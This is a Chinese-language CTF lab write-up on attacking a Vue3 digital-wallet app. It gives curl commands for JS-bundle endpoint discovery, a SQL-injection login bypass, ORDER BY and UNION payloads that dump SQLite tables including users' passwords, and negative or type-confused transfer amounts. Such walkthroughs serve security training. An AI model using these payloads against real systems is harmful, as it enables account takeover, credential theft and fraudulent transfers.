# CTF 靶场: Digital Wallet Lab — SQLi 登录绕过 + SQLite UNION 注入 + 业务逻辑漏洞

来源: 2026-08 会话 (38.60.125.120:30017, Vue3+Vuetify 数字钱包, 60 分钟 CTF)
结果: 全程 <20 分钟拿到 flag `CTF{w4llet_1dor_sqli_bu51ness_l0g1c}`

## 靶场画像

- Vue3 + Vuetify SPA; 登录页列出账号 alice/bob/charlie (普通用户)
- API 全在 `/api/*`, 认证 `Authorization: Bearer <JWT>`
- 前端 bundle 暴露 6 个端点: POST /api/login, GET /api/me, GET /api/balance,
  POST /api/transfer {to_user_id, amount, note}, GET /api/transactions, GET /api/users
- 后端是 **SQLite** (关键!) + Flask/FastAPI 类; 弱口令全灭, 无验证码无限速

## 攻击链 (可复用模板)

### 1. 前端 JS 提取 API (见 vite-vue3-api-discovery.md)
```bash
# 下载所有 chunk
grep -oE 'assets/[a-zA-Z0-9._-]+\.js' main.js | sort -u | xargs -I{} curl -s http://TARGET/{} -o {}
# axios 实例通常在最末: baseURL:"/api" + 导出函数
grep -oE '(post|get|put|delete)\s*\(\s*["'"'`]([^"'"'`]+)' *.js | sort -u
```

### 2. SQLi 登录绕过
```bash
curl -X POST http://TARGET/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin'"'"' OR '"'"'1'"'"'='"'"'1","password":"x"}'
# → {"message":"登录成功","token":"eyJ...","user":{"id":6,"username":"admin","role":"admin","balance":999999.99}}
```

### 3. UNION 注入列数确定 (ORDER BY 二分)
```bash
for i in 1 2 3 4 5 6 7 8; do
  curl -s -X POST http://TARGET/api/login -H 'Content-Type: application/json' \
    -d "{\"username\":\"admin' ORDER BY $i-- \",\"password\":\"x\"}" | head -c 60; echo "  <- $i"
done
# ORDER BY 6 成功 / ORDER BY 7 报"服务器内部错误" → 6 列
# UNION SELECT 1,2,3,4,5,6  → user 对象即列映射 (id=1, username=2, name=3, balance=4, role=5, email=6)
```

### 4. **SQLite 特有枚举 (最大坑点)**
MySQL 思维直接套 `information_schema` 会全部报"服务器内部错误"——**先确认 DBMS**:
```bash
# sqlite_version() 能执行 = SQLite (MySQL 用 version(), PG 用 version())
x' UNION SELECT 1,sqlite_version(),3,4,5,6-- 
# → "3.49.2"
```
SQLite 无 information_schema, 改用:
```sql
-- 列全部表
SELECT group_concat(name) FROM sqlite_master WHERE type='table'
-- 表结构 (CREATE TABLE 原文)
SELECT sql FROM sqlite_master WHERE name='users'
-- 列清单
SELECT group_concat(name||':'||type) FROM pragma_table_info('flags')
-- 拖数据 (group_concat + 分隔符; 注意 0x0a 或 '|' 分隔, 列值含引号会断)
SELECT group_concat(id||':'||username||':'||password,' | ') FROM users
SELECT group_concat(id||'='||flag_value,'|') FROM flags
```
注入点 JSON 里写 payload 时, 单引号转义规则: `'` → `'"'"'` (bash) 或 JSON `\'`。

### 5. 业务逻辑漏洞 (wallet 类靶场标配)
- **负数转账**: `{"amount":-100}` → 转账成功且**自己余额 +100** (反向吸金/无限刷钱)
- **类型混淆**: `{"amount":"1e2"}` (字符串) → 记账 100 但余额只扣 1 (校验用 == 比较/浮点陷阱)
- 金额校验缺失: 0 被拒但负数放行; 超大金额报"余额不足" (说明有余额检查但无正数检查)
- 不可向自己转账 (有检查); 无 to_user_id 越权检查时 = IDOR

## 数据结果参考
```
users: 1:alice:alice123 | 2:bob:bob456 | 3:charlie:charlie789 | 4:david:david000 | 5:eve:eve_pass | 6:admin:Admin@P@ssw0rd!2024#Secure
flags: 1=CTF{w4llet_1dor_sqli_bu51ness_l0g1c}
```
密码明文存储 + JWT HS256 (弱密钥爆破常见词表未命中, 但 SQLi 已够用)。

## 经验
- 登录框 SQLi 是第一优先级——`' OR '1'='1` 一次即中, 之后 UNION 全库拖取
- **information_schema 报错 ≠ 无注入, 是 DBMS 不对**; sqlite_master / pragma_table_info 是 SQLite 专有路径
- SPA 目录枚举 /api/flag 等全返回 200 HTML 是 vue-router fallback, 别被误导——真实端点从 JS bundle 里挖
- group_concat 拖整列时, 字段本身含特殊字符会截断 JSON; 用 || 拼接 id 前缀可定位
